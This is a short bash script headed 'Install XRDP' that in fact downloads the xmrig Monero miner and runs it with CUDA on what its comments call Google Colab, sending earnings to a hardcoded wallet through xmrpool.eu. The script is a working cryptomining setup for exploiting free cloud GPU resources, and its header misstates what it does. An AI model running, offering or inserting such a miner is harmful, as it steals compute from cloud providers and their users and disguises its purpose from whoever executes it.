#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig --cuda -o xmrpool.eu:9999 -u 428L39EKKf6cddR8PMatpQPDfT2foU3NNUjMq3gwD682SznbmTyVt9rhyJr7bJebLy2b3CPDwzh4u9uit7M9QJHjG1ojv8G -k --tls
